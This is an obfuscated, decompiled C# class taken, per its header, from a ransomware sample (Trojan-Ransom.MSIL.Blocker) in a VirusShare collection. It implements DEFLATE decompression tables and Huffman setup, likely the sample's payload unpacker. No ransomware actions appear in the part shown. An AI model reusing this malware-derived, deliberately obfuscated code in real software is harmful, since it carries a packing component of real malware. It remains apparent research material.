// Decompiled with JetBrains decompiler
// Type: #N.#R
// Assembly: 2012, Version=0.0.0.0, Culture=neutral, PublicKeyToken=6bd9dd2807ddb306
// MVID: 60A44901-35B0-4353-8B52-C0C6D76F7330
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-bce34ba0f1377c1ba0cacdad73240d780dcf59cb.exe

using \u0023N;
using \u0023Tb;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace \u0023N
{
  internal sealed class \u0023R
  {
    internal sealed class \u00237
    {
      internal static readonly int[] \u0023S = new int[29]
      {
        3,
        4,
        5,
        6,
        7,
        8,
        9,
        10,
        11,
        13,
        15,
        17,
        19,
        23,
        27,
        31,
        35,
        43,
        51,
        59,
        67,
        83,
        99,
        115,
        131,
        163,
        195,
        227,
        258
      };
      internal static readonly int[] \u0023T = new int[29]
      {
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        1,
        1,
        1,
        1,
        2,
        2,
        2,
        2,
        3,
        3,
        3,
        3,
        4,
        4,
        4,
        4,
        5,
        5,
        5,
        5,
        0
      };
      internal static readonly int[] \u0023U = new int[30]
      {
        1,
        2,
        3,
        4,
        5,
        7,
        9,
        13,
        17,
        25,
        33,
        49,
        65,
        97,
        129,
        193,
        257,
        385,
        513,
        769,
        1025,
        1537,
        2049,
        3073,
        4097,
        6145,
        8193,
        12289,
        16385,
        24577
      };
      internal static readonly int[] \u0023V = new int[30]
      {
        0,
        0,
        0,
        0,
        1,
        1,
        2,
        2,
        3,
        3,
        4,
        4,
        5,
        5,
        6,
        6,
        7,
        7,
        8,
        8,
        9,
        9,
        10,
        10,
        11,
        11,
        12,
        12,
        13,
        13
      };
      internal int \u0023W;
      internal int \u0023X;
      internal int \u0023Y;
      internal int \u0023Z;
      internal int \u00230;
      internal bool \u00231;
      internal \u0023R.\u0023db \u00232;
      internal \u0023R.\u00233 \u00233;
      internal \u0023R.\u0023xb \u00234;
      internal \u0023R.\u0023jb \u00235;
      internal \u0023R.\u0023jb \u00236;

      public \u00237([In] byte[] obj0)
      {
        this.\u00232 = new \u0023R.\u0023db();
        this.\u00233 = new \u0023R.\u00233();
        this.\u0023W = 2;
        \u0023\u0023.\u0023Fc(obj0.Length, obj0, 0, this.\u00232);
      }
    }

    internal sealed class \u0023db
    {
      internal byte[] \u00238;
      internal int \u00239 = 0;
      internal int \u0023ab = 0;
      internal uint \u0023bb = 0;
      internal int \u0023cb = 0;
    }

    internal sealed class \u00233
    {
      internal byte[] \u00238 = new byte[32768];
      internal int \u0023eb = 0;
      internal int \u0023fb = 0;
    }

    internal sealed class \u0023jb
    {
      internal short[] \u0023gb;
      public static readonly \u0023R.\u0023jb \u0023hb;
      public static readonly \u0023R.\u0023jb \u0023ib;

      static \u0023jb()
      {
        byte[] numArray1 = new byte[288];
        int num1 = 0;
        while (num1 < 144)
          numArray1[num1++] = (byte) 8;
        while (num1 < 256)
          numArray1[num1++] = (byte) 9;
        while (num1 < 280)
          numArray1[num1++] = (byte) 7;
        while (num1 < 288)
          numArray1[num1++] = (byte) 8;
        \u0023R.\u0023jb.\u0023hb = new \u0023R.\u0023jb(numArray1);
        byte[] numArray2 = new byte[32];
        int num2 = 0;
        while (num2 < 32)
          numArray2[num2++] = (byte) 5;
        \u0023R.\u0023jb.\u0023ib = new \u0023R.\u0023jb(numArray2);
      }

      public \u0023jb([In] byte[] obj0) => \u0023\u0023.\u0023ec(this, obj0);
    }

    internal sealed class \u0023xb
    {
      internal static readonly int[] \u0023kb = new int[3]
      {
        3,
        3,
        11
      };
      internal static readonly int[] \u0023lb = new int[3]
      {
        2,
        3,
        7
      };
      internal byte[] \u0023mb;
      internal byte[] \u0023nb;
      internal \u0023R.\u0023jb \u0023ob;
      internal int \u0023W;
      internal int \u0023pb;
      internal int \u0023qb;
      internal int \u0023rb;
      internal int \u0023sb;
      internal int \u0023tb;
      internal byte \u0023ub;
      internal int \u0023vb;
      internal static readonly int[] \u0023wb;

      static \u0023xb()
      {
        int[] numArray = new int[19];
        // ISSUE: field reference
        RuntimeFieldHandle fldHandle = __fieldref (\u0023Sb.\u0023Pb);
        if (true)
          goto label_2;
label_1:
        \u0023R.\u0023xb.\u0023wb = numArray;
        return;
label_2:
        RuntimeHelpers.InitializeArray((Array) numArray, fldHandle);
        goto label_1;
      }
    }

    internal sealed class \u0023Db
    {
      private static readonly int[] \u0023wb = new int[19]
      {
        16,
        17,
        18,
        0,
        8,
        7,
        9,
        6,
        10,
        5,
        11,
        4,
        12,
        3,
        13,
        2,
        14,
        1,
        15
      };
      internal static readonly byte[] \u0023yb = new byte[16]
      {
        (byte) 0,
        (byte) 8,
        (byte) 4,
        (byte) 12,
        (byte) 2,
        (byte) 10,
        (byte) 6,
        (byte) 14,
        (byte) 1,
        (byte) 9,
        (byte) 5,
        (byte) 13,
        (byte) 3,
        (byte) 11,
        (byte) 7,
        (byte) 15
      };
      private static readonly short[] \u0023zb = new short[286];
      private static readonly byte[] \u0023Ab = new byte[286];
      private static readonly short[] \u0023Bb;
      private static readonly byte[] \u0023Cb;

      static \u0023Db()
      {
        if (true)
          goto label_13;
label_2:
        int index1;
        for (; index1 < 144; \u0023R.\u0023Db.\u0023Ab[index1++] = (byte) 8)
          \u0023R.\u0023Db.\u0023zb[index1] = \u0023\u0023.\u0023rc(48 + index1 << 8);
        for (; index1 < 256; \u0023R.\u0023Db.\u0023Ab[index1++] = (byte) 9)
          \u0023R.\u0023Db.\u0023zb[index1] = \u0023\u0023.\u0023rc(256 + index1 << 7);
        for (; index1 < 280; \u0023R.\u0023Db.\u0023Ab[index1++] = (byte) 7)
          \u0023R.\u0023Db.\u0023zb[index1] = \u0023\u0023.\u0023rc(index1 - 256 << 9);
        for (; index1 < 286; \u0023R.\u0023Db.\u0023Ab[index1++] = (byte) 8)
          \u0023R.\u0023Db.\u0023zb[index1] = \u0023\u0023.\u0023rc(index1 - 88 << 8);
        \u0023R.\u0023Db.\u0023Bb = new short[30];
        \u0023R.\u0023Db.\u0023Cb = new byte[30];
        for (int index2 = 0; index2 < 30; ++index2)
        {
          \u0023R.\u0023Db.\u0023Bb[index2] = \u0023\u0023.\u0023rc(index2 << 11);
          \u0023R.\u0023Db.\u0023Cb[index2] = (byte) 5;
        }
        return;
label_13:
        index1 = 0;
        goto label_2;
      }
    }

    internal sealed class \u0023Eb : MemoryStream
    {
      public \u0023Eb([In] byte[] obj0)
        : base(obj0, false)
      {
      }
    }
  }
}
